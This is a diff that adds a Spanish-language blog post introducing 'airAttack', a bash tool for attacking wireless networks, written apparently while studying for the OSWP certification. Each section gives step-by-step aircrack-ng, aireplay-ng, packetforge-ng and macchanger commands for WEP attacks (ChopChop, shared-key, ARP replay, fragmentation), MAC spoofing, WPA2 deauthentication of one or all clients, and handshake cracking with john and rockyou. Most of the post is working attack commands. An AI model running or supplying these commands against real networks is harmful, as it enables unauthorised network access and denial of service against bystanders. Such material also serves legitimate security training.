@@ -1,0 +1,87 @@
+<p><img src="/assets/images/airAttack/AIR-ATTACK-Header.jpg" alt="" /></p>
+
+<p><strong>airAttack</strong> es una herramienta ofensiva para automatizar los ataques a redes inalámbricas escrita en bash. Esta herramienta será mejorada por mi próximamente para para optimizar determinadas porciones de código. Los ataques de denegación de servicio así como nuevas funciones serán añadidas. Este programa lo escribí cuando estaba estudiando para el OSWP (Offensive Security Wireless Professional).</p>
+
+<p>En este artículo, explicaré cada ataque que puede utilizarse en airAttack, la finalidad y como ejecutarlo manualmente.</p>
+
+<p>La herramienta se puede descargar en:</p>
+
+<ul>
+  <li><a href="https://github.com/e1abrador/airAttack">https://github.com/e1abrador/airAttack</a></li>
+</ul>
+
+<h2> Ataques WEP </h2>
+
+<p>Antes de empezar con los ataques WEP, es importante recalcar que todos estos ataques están enfocados obtener el máximo número de IVS para poder crackear la contraseña, a diferéncia de los ataques WPA2, cuya prioridad es obtener el hash de la red para poder posteriormente crackearlo.</p>
+
+<p><strong>IVS:</strong> Los IVS, también conocidos como “Archivos de Vector de inicialización”, se clasifican como archivos de datos que contienen vectores de  inicialización que son necesarios para la generación de los datos cifrados en la red.</p>
+
+<h3><u>Chop</u> <u>Chop</u> <u>Attack</u></h3>
+<p>El ataque de <strong>Chop Chop</strong> consiste en coger un byte de datos de un paquete encriptado WEP, substituyendo los valores de los bytes del paquete y recalculando la suma de verificación del encriptado. Los paquetes ya modificados se envían al router, el router simplemente los descarta hasta que el atacante finalmente logra sustituir una suma de verificación válida.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>airodump-ng <span class="nt">-c</span> canal_de_ap <span class="nt">--bssid</span> mac_de_ap <span class="nt">-w</span> captura wlan0
+aireplay-ng <span class="nt">-1</span> 6000 <span class="nt">-o</span> 1 <span class="nt">-q</span> 10 <span class="nt">-a</span> mac_de_ap <span class="nt">-h</span> mac_tarjeta wlan0
+aireplay-ng <span class="nt">-4</span> <span class="nt">-a</span> mac_de_ap <span class="nt">-h</span> mac_tarjeta wlan0
+packetforge-ng <span class="nt">-0</span> <span class="nt">-a</span> mac_de_ap <span class="nt">-h</span> mac_tarjeta <span class="nt">-l</span> 192.168.1.2 <span class="nt">-k</span> 192.168.1.255 <span class="nt">-y</span> <span class="k">*</span>.xor <span class="nt">-w</span> ataque_chopchop
+aireplay-ng <span class="nt">-2</span> <span class="nt">-r</span> ataque_chopchop wlan0
+aircrack-ng captura-01.cap
+</code></pre></div></div>
+
+<p><strong>Nota:</strong> Es importante dejar un pequeño espacio de tiempo entre comando y comando y esperar a que cada comando se inyecte correctamente en el router.</p>
+
+<h3><u>SKA</u></h3>
+<p>El ataque <strong>SKA</strong>, también conocido como “Broken Shared Key Authentication” consiste en copiar la dirección MAC de un cliente ya conectado a la red en nuestra própia tarjeta de red y generar un ataque de falsa autenticación con nuestra nueva MAC (MAC copiada del cliente previamente autenticado), el objetivo de autenticar nuestra MAC es generar paquetes ARP en la red.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>airodump-ng <span class="nt">--bssid</span> mac_de_ap <span class="nt">-c</span> canal_de_ap wlan0 -&gt; Por ahora no es necesario empezar a capturar paquetes.
+</code></pre></div></div>
+<p>Cuando tenemos el punto de acceso localizado y la MAC localizada, dejaremos de ver el tráfico de la red con airodump y procederemos a cambiar la MAC de nuestra tarjeta de red, con el siguiente one-liner se puede cambiar.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ifconfig wlan0 down &amp;&gt; /dev/null <span class="o">&amp;&amp;</span> macchanger <span class="nt">--mac</span> mac_de_cliente wlan0 &amp;&gt; /dev/null <span class="o">&amp;&amp;</span> ifconfig wlan0 up &amp;&gt; /dev/null
+</code></pre></div></div>
+
+<p><strong>Nota</strong>: Puede que sea necesario ejecutar por segunda vez el one-liner para que se cambie correctamente.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>airodump-ng <span class="nt">-w</span> captura <span class="nt">--bssid</span> mac_de_ap <span class="nt">-c</span> canal_de_ap wlan0
+aireplay-ng <span class="nt">-3</span> <span class="nt">-b</span> mac_de_ap <span class="nt">-h</span> mac_tarjeta wlan0
+aireplay-ng <span class="nt">-0</span> 1 <span class="nt">-e</span> essid_de_ap <span class="nt">-a</span> mac_de_ap <span class="nt">-h</span> mac_de_ap wlan0
+aircrack-ng captura-01.cap
+</code></pre></div></div>
+
+<h3><u>ARP</u> <u>Request</u> <u>Replay</u> <u>Attack</u></h3>
+
+<p>El ataque de <strong>ARP Request Replay Attack</strong> consiste en inyectar nuestra MAC en el router víctima, posteriormente se genera un ataque de denegación de servicio sobre uno de los clientes conectados (si este ataque se lanza contra todos, se obtendrán mas IVS, haciendo que la probabilidad de crackear la clave será más alta) y, cuando dichos clientes se vuelnvan a conectar a la red, se genererarán de forma automática paquetes ARP, lo que generará IVS.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>airodump-ng <span class="nt">-w</span> captura <span class="nt">--bssid</span> mac_de_ap <span class="nt">-c</span> canal_de_ap wlan0
+aireplay-ng <span class="nt">-3</span> <span class="nt">-x</span> 1000 <span class="nt">-n</span> 1000 <span class="nt">-b</span> mac_de_ap <span class="nt">-h</span> mac_de_tarjeta wlan0
+aireplay-ng <span class="nt">-0</span> 5 <span class="nt">-a</span> mac_de_ap <span class="nt">-h</span> mac_de_cliente_conectado wlan0
+aircrack-ng captura-01.cap
+</code></pre></div></div>
+
+<h3><u>Fragmentation</u> <u>Attack</u></h3>
+
+<p>Este ataque necesita que 1 único paquete de datos sea capturado por airodump. Posteriormente, se genera un nuevo paquete modificado con la dirección MAC de nuestra tarjeta de red y se inyecta el paquete modificado por el atacante en el punto de acceso objetivo. De esta forma, se generarán paquetes ARP y, en consecuéncia, los IVS necesários para crackear la clave.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>airodump-ng <span class="nt">-w</span> captura <span class="nt">--bssid</span> mac_de_ap <span class="nt">-c</span> canal_de_ap wlan0
+aireplay-ng <span class="nt">-1</span> 6000 <span class="nt">-o</span> 1 <span class="nt">-q</span> 10 <span class="nt">-a</span> mac_de_ap <span class="nt">-h</span> mac_tarjeta wlan0 -&gt; es muy recomendable dejar el cliente inyectado, ya que facilitará la obtención del paquete de datos.
+packetforge-ng <span class="nt">-0</span> <span class="nt">-a</span> mac_de_ap <span class="nt">-h</span> mac_de_tarjeta <span class="nt">-l</span> 192.168.1.2 <span class="nt">-k</span> 192.168.1.255 <span class="nt">-y</span> <span class="k">*</span>.xor <span class="nt">-w</span> fragmentation_attack
+aireplay-ng <span class="nt">-2</span> <span class="nt">-r</span> fragmentation_attack wlan0
+aircrack-ng captura-01.cap
+</code></pre></div></div>
+
+<h2> Ataques WPA2 </h2>
+
+<p>El protocolo WPA2 hace años que empezó a monopolizarse en los routers instalados por las compañías telefónicas. Aun que si que es verdad que el protocolo WEP no se suele utilizar, aún hay routers que lo implementan, ya que hay dispositivos (si són de última generación suele no pasar) que únicamente aceptan el procolo WEP.</p>
+
+<p>El objetivo en estas redes es obtener un hash para poder crackearlo mediante el uso de un diccionario de contraseñas.</p>
+
+<h3><u>Ataque</u> <u>de</u> <u>deautenticación</u></h3>
+
+<p>El <strong>ataque de deautenticación</strong> ataque es un ataque de denegación de servicio, el objetivo es provocar que la víctima se reconecte al punto de acceso, en el momento que un dispositivo se conecta al router, se genera un packete handshake, el cual contiene la contraseña hasheada de la red inalámbrica.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>airodump-ng <span class="nt">-c</span> canal_de_ap <span class="nt">--bssid</span> mac_de_ap <span class="nt">-w</span> captura wlan0
+aireplay-ng <span class="nt">-0</span> 15 <span class="nt">-a</span> mac_de_ap <span class="nt">-h</span> mac_de_cliente wlan0 -&gt; se utiliza para deautenticar a un solo cliente de la red
+aireplay-ng <span class="nt">-0</span> 15 <span class="nt">-a</span> mac_de_ap <span class="nt">-c</span> FF:FF:FF:FF:FF:FF  wlan0 -&gt; se utiliza para deautenticar a todos los clientes de la red
+aircrack-ng <span class="nt">-J</span> miCaptura captura.cap
+hccap2john miCaptura.hccap <span class="o">&gt;</span> <span class="nb">hash
+</span>john <span class="nt">--wordlist</span><span class="o">=</span>rockyou.txt <span class="nb">hash</span>
+</code></pre></div></div>
